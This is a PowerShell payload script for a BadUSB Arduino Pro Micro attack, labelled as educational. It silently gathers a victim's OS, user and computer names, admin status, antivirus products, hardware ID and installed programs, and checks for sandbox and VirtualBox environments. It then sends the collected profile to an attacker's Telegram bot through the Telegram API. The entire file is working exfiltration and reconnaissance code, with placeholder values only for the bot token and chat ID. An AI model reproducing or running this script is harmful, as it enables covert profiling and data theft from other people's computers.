#  │ Author     : Cisamu
#  │ Name       : BadUSB-ArduinoProMicro
#  │ Contact    : https://github.com/cisamu123

#  > This program is distributed for educational purposes only. 

function Send-TelegramText {
    param (
        [string]$Text
    )

    # Telegram bot token
    $token = "TELEGRAM_TOKEN_HERE"
    # Telegram chat ID
    $chatID = "TELEGRAM_CHAT_ID_HERE"
    # Telegram API URL for sending messages
    $uri = "https://api.telegram.org/bot$token/sendMessage"

    # Parameters for the API call
    $params = @{
        chat_id = $chatID
        text    = $Text
    }

    try {
        # Send GET request to Telegram API
        Invoke-RestMethod -Uri $uri -Method Get -Body $params
    }
    catch {
        # Warn if sending message fails
        Write-Warning "Failed to send message to Telegram: $_"
    }
}

function Get-InstalledPrograms {
    $programs = @()
    # Registry paths where installed programs are listed
    $keys = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    foreach ($key in $keys) {
        # Collect program names from registry
        $programs += Get-ItemProperty $key -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object -ExpandProperty DisplayName
    }
    # Remove duplicates and sort
    $programs = $programs | Sort-Object -Unique
    # Return only first 20 programs to avoid too long messages
    $topPrograms = $programs | Select-Object -First 20
    return ($topPrograms -join ", ")
}

function Test-Debugger {
    # Stub function for debugger detection, can be expanded with real checks
    return $false
}

function Test-Sandboxie {
    # Check if Sandboxie service is running
    $sandboxieProc = Get-Process -Name "SbieSvc" -ErrorAction SilentlyContinue
    return $sandboxieProc -ne $null
}

function Test-VirtualBox {
    # Check if BIOS serial number contains "VBOX" indicating VirtualBox environment
    $bios = Get-CimInstance Win32_BIOS
    return $bios.SerialNumber -like "*VBOX*"
}

# --- Gather system information ---

$os = Get-CimInstance Win32_OperatingSystem
$systemVersion = "$($os.Caption) $($os.Version)"
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$systemTime = Get-Date -Format "yyyy-MM-dd h:mm:ss tt"

# Check if script is running with administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

# Get installed antivirus products (if any)
$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue
if ($av) {
    $antivirus = $av.displayName -join ', '
} else {
    $antivirus = "Not detected"
}

# Get hardware info
$cpu = (Get-CimInstance Win32_Processor).Name
$gpu = (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name
$ramBytes = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
$ramMB = [math]::Round($ramBytes / 1MB)
$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID

# Get a list of installed programs
$programList = Get-InstalledPrograms

# Construct the message to send
$message = @"
💻 Computer info:
System: $systemVersion
Computer name: $computerName
User name: $userName
System time: $systemTime

👾 Protection:
Installed antivirus: $antivirus
Started as admin: $isAdmin
Process protected: $isAdmin

👽 Virtualization:
Debugger: $(Test-Debugger)
Sandboxie: $(Test-Sandboxie)
VirtualBox: $(Test-VirtualBox)

🔭 Software:
$programList

📇 Hardware:
CPU: $cpu
GPU: $gpu
RAM: ${ramMB}MB
HWID: $hwid
"@

# Limit message length to max 4000 characters to avoid Telegram errors
if ($message.Length -gt 4000) {
    $message = $message.Substring(0, 4000) + "`n... (message truncated)"
}

# Send the constructed message to Telegram
Send-TelegramText -Text $message
